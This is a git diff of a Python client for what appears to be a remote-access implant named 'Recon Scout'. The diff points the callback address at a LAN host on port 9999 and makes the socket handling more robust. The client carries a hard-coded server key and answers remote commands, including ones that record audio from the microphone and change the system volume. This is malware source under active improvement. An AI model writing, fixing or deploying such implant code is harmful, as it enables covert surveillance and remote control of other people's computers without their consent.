@@ -9,7 +9,7 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 port = 9999
-ip_addr = '127.0.0.1'
+ip_addr = '192.168.101.9'
 type_of_scout = 'Recon Scout'
 server_key = 'LdtwGvWUNeuRqrxCjpMyFEhnOPsISzBbTfQKVAZkDiomlJHgcX'
 End = 'vfyNAiIeoLbExRYCMWzJtXqcDFZlrapVTKgBmUshSjPkGQHdnu'
@@ -257,9 +257,9 @@ def main():
                         s.sendall('[-]Please specify an integer as the sleep duration' + End)
                         continue
                     s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
+                    s.shutdown(1)
+                    s.close()
                     for i in range(sleep_time):
-                        s.shutdown(1)
-                        s.close()
                         sleep(1)
                     break
                 elif command == 'active':
@@ -357,7 +357,7 @@ def main():
                         seconds = int(data[1])
                         record_audio(seconds)
                     except (IndexError, TypeError):
-                        s.sendall('[-]Please supply an integer as the argument')
+                        s.sendall('[-]Please supply an integer as the argument' + End)
                 elif command == 'set_audio':
                     try:
                         level = float(data[1])
@@ -367,9 +367,12 @@ def main():
                 else:
                     s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
             except (socket.error, socket.timeout):
-                s.shutdown(1)
-                s.close()
-                break
+                try:
+                    s.shutdown(1)
+                    s.close()
+                    break
+                except socket.error:
+                    break
             except Exception as e:
                 try:
                     if command:
